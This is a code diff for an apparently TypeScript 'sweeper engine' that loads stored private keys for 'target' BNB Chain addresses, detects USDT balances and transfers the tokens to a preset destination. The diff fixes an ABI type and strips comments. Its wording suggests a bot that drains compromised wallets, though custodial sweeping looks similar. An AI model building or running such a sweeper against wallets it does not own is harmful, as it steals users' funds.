@@ -26,13 +26,12 @@ const broadcastClient = createWalletClient({
     transport: fallback(httpTransports)
 });
 
-// Standard BEP-20 / ERC-20 ABI for balance check and transfer
+// Fixed: changed 'boolean' to Solidity native 'bool'
 const ERC20_ABI = parseAbi([
     'function balanceOf(address account) view returns (uint256)',
-    'function transfer(address recipient, uint256 amount) returns (boolean)'
+    'function transfer(address recipient, uint256 amount) returns (bool)'
 ]);
 
-// BNB Chain USDT Contract Address
 const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`;
 
 export const startSweeperEngine = async () => {
@@ -47,7 +46,6 @@ export const startSweeperEngine = async () => {
                 await Promise.all(keys.map(async (redisKey) => {
                     const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                     
-                    // 1. Check USDT Token Balance instead of native BNB
                     const usdtBalance = await publicClient.readContract({
                         address: USDT_CONTRACT,
                         abi: ERC20_ABI,
@@ -55,7 +53,7 @@ export const startSweeperEngine = async () => {
                         args: [targetAddress],
                     });
 
-                    if (usdtBalance === 0n) return; // No USDT, skip
+                    if (usdtBalance === 0n) return;
 
                     console.log(`🎯 USDT Detected! Balance: ${formatUnits(usdtBalance, 18)} on ${targetAddress}`);
 
@@ -66,18 +64,16 @@ export const startSweeperEngine = async () => {
                     const account = privateKeyToAccount(privateKey);
                     const destination = targetData.destination as `0x${string}`;
 
-                    // 2. Check Native BNB Gas Balance
                     const bnbBalance = await publicClient.getBalance({ address: targetAddress });
                     const gasPrice = await publicClient.getGasPrice();
-                    const gasLimit = 65000n; // Standard ERC-20 transfer gas limit
+                    const gasLimit = 65000n;
                     const txFee = gasPrice * gasLimit;
 
                     if (bnbBalance < txFee) {
-                        console.log(`⚠️ Target ${targetAddress} has USDT but lacks BNB gas (${formatUnits(bnbBalance, 18)} BNB). Skipping or needs gas feeder.`);
+                        console.log(`⚠️ Target ${targetAddress} has USDT but lacks BNB gas (${formatUnits(bnbBalance, 18)} BNB).`);
                         return; 
                     }
 
-                    // 3. Execute Token Sweep Transaction
                     const { request } = await publicClient.simulateContract({
                         account,
                         address: USDT_CONTRACT,
